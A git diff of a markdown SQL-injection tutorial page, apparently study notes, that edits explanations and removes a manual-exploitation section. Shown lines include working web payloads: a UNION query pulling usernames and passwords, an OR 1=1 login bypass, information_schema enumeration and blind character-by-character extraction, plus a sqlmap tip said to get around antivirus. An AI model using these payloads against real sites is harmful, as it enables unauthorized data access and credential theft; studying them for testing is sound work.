@@ -44,7 +44,7 @@ In some cases, SQL injections are possible. It means that instead of providing o
 $sql = "Select name,desc from product where name LIKE '%$name%'";
 ```
 
-If the user enter the following value instead of a product name
+If the user enter the following payload (value) instead of a product name
 
 ```php
 ' UNION Select username,password FROM users-- -
@@ -108,9 +108,9 @@ There are many scenarios in which a hacker will find a SQL injection. The exampl
 <tr><td>Boolean-based</td><td>The attack will first look for a successful injectable query. Then, it will append to the working query a condition such as  "AND is the DBMS starting with 's'". If the query is successful, then it means the answer was "yes". Question by question, the hacker is mapping the database.
 </td></tr>
 
-<tr><td>Time-based</td><td>The attack add in the request a call to `sleep(n)` if successful. If the request take $n$ seconds, then the hacker will know that the query was successful.</td></tr>
+<tr><td>Time-based</td><td>The attack add in the request a call to <code>sleep(n)</code> if successful. If the request take $n$ seconds more than usual, then the hacker will know that the query was successful.</td></tr>
 
-<tr><td>Others</td><td>Out-of-band-based, Voice-based, and Stacked queries-based.
+<tr><td>Others</td><td>Out-of-band-based, Voice-based, Stacked queries-based...
 </td></tr>
 </tbody></table>
 </div><div>
@@ -134,7 +134,7 @@ Mitigations
 
 <div class="row row-cols-md-2"><div>
 
-From the [SQLMap GitHub Repository](https://github.com/sqlmapproject/sqlmap): "sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.".
+From the [SQLMap GitHub Repository](https://github.com/sqlmapproject/sqlmap) (25k ⭐): "sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.".
 
 Try injecting a form
 
@@ -170,7 +170,7 @@ Notes
 > [SQLMap CheatSheet](https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet) (external)
 </div></div>
 
-> You can use **BurpSuite** with SQLMap. Once you intercepted a request, right-click on it, and use **Save item**. Then, in SQLMap, use `-r /path/to/your/saved/item`. If your antivirus is blocking SQLMap, it may bypass it.
+> You can use **BurpSuite** with SQLMap. Once you intercepted a request, right-click on it, and use **Save item**. Then, in SQLMap, use `-r /path/to/your/saved/item`. If your antivirus is blocking SQLMap, this may bypass it.
 
 <hr class="sl">
 
@@ -178,67 +178,16 @@ Notes
 
 <div class="row row-cols-md-2"><div>
 
-Login without password on a website that do not encrypt passwords. The `1=1` is, like `-- -`, something to support some DBMS that are not allowing "1", or "TRUE".
+Testing if a SQL injection is possible. If it "works", it means that we will have "3 quotes" in the SQL query, so there will be an error.
+
+```none
+'
+```
+</div><div>
+
+Login without password on a website that do password check in an injectable query. The `1=1` is, like `-- -`, something to support some DBMS that are not allowing "1", or "TRUE".
 
 ```none
 ' OR 1=1 -- -
 ```
-</div><div>
-</div></div>
-
-<hr class="sr">
-
-## Do the job manually
-
-<div class="row row-cols-md-2"><div>
-
-**Union-based SQLi** can only be achieved is the two queries have the same number of attributes in the SELECT, as per the property of the UNION clause. As such, hackers are simply adding "null", one by one if in a boolean-based scenario, until they found how much attributes were selected in the original query.
-
-```sql
--- you don't known the query
-SELECT [...] UNION SELECT NULL -- fail
-SELECT [...] UNION SELECT NULL, NULL -- fail
-SELECT [...] UNION SELECT NULL, NULL, NULL -- fail
-SELECT [...] UNION SELECT NULL, NULL, NULL, NULL -- OK
-```
-
-In the case above, we know that there are 4 attributes in the select, even if we don't know which ones! Once we found the tables/column names, we will use that to fetch data.
-
-Another way to get the number of column is used the property of ORDER BY. This clause can take an index, which is a shortcut for the $nth$ in the select. If you use an invalid $n$, then the requests fails.
-
-```sql
--- you don't known the query
-SELECT [...] ORDER BY 1 -- fail
-SELECT [...] ORDER BY 2 -- fail
-SELECT [...] ORDER BY 3 -- fail
-SELECT [...] ORDER BY 4 -- OK
-```
-</div><div>
-
-Now that you found the number of column, you should try to get some data from the database. In a **Union-based SQLi**, just use SQL commands, and have fun.
-
-```sql
--- you don't known the query
-SELECT [...]
-UNION 
--- tables
-SELECT TABLE_NAME, NULL, NULL, NULL
-FROM information_schema.TABLES
-UNION
--- database + version + user
-SELECT NULL, database(), @@version, user()
-```
-
-In a **Error-based SQLi**, the job will take LONGER 😢. You will have to try letter by letter. To find the first letter of the database, you will have to use iterative payloads such as
-
-```
-' AND (ascii(substr((select database()),1,1))) = ascii('a') -- -
-' AND (ascii(substr((select database()),1,1))) = ascii('b') -- -
-' AND (ascii(substr((select database()),1,1))) = ascii('c') -- -
-[...]
-' AND (ascii(substr((select database()),1,1))) = ascii('z') -- -
-```
-
-Then, process with the second, the third letter... Actually, there aren't that many DBMS, like, well, you could try some letters first.
-
 </div></div>
